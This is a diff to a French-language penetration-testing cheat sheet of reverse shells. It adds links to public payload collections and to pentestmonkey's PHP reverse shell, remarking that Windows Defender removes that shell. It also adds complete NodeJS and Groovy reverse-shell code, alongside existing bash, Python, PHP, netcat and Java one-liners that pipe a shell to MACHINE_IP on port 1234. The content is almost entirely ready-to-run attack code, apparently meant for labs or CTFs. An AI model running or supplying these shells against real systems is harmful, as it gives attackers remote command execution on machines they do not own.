@@ -31,6 +31,7 @@ nmap> !sh
 ## __Scripts__
 
 Pour générer des reverses shells vous pouvez utiliser le site de 0day, [revshells](https://www.revshells.com/)
+Vous pouvez aussi utiliser [ce git](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)
 
 ### Bash
 
@@ -56,6 +57,10 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 php -r '$sock=fsockopen("MACHINE_IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
+ou 
+
+[Celui ci](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), mais windows defender le supprimera.
+
 ### Ruby
 
 ```ruby
@@ -74,4 +79,43 @@ nc -e /bin/sh MACHINE_IP 1234
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/MACHINE_IP/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+```
+
+### NodeJS
+
+```javascript
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1234, "MACHINE_IP", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+```
+
+### Groovy
+
+```groovy
+String host="MACHINE_IP";
+int port=1234;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+	while(pi.available()>0)so.write(pi.read());
+	while(pe.available()>0)so.write(pe.read());
+	while(si.available()>0)po.write(si.read());
+	so.flush();
+	po.flush();Thread.sleep(50);
+	try {p.exitValue();break;}catch (Exception e){}
+};
+p.destroy();
+s.close();
 ```
